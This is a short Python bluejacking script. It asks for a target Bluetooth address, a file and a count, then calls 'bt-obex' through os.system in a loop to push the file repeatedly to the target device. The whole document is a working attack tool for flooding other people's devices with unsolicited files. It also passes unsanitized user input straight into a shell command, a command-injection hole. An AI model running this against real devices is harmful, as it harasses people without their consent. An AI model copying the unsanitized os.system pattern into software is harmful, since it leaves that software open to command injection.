import os
import time
from os import path

def printLogo():
   print()
   print('BLUEJACKING:')
   print()
	
def main():
   printLogo()
   target_addr = input('Target addr > ')
	
   if len(target_addr) < 1:
      print('[!] ERROR: Target addr is missing')
      exit(0)
            
   file_name = input('File Name > ')
         
   if len(file_name) < 1:
      print('[!] ERROR: File name is missing')
      exit(0)      
            
   if not path.exists(file_name):
      print('[!] ERROR: File is missing')
      exit(0)
            
   count = int(input('Count > '))
         
   if count < 1:
      print('Positive Integer Allowed')
      exit(0)
            
   print('Sending Files')
   
   cmd = f'bt-obex -p {target_addr} {file_name}'
   
   for i in range(0, count):
      print(cmd)
      os.system(cmd)    	
      time.sleep(1)
      print(f'{i + 1} file send')
      
if __name__ == '__main__':
   try:
      main()
      
   except Exception as e:
      print(e)
      print('Error !!!')
      
      
         
         
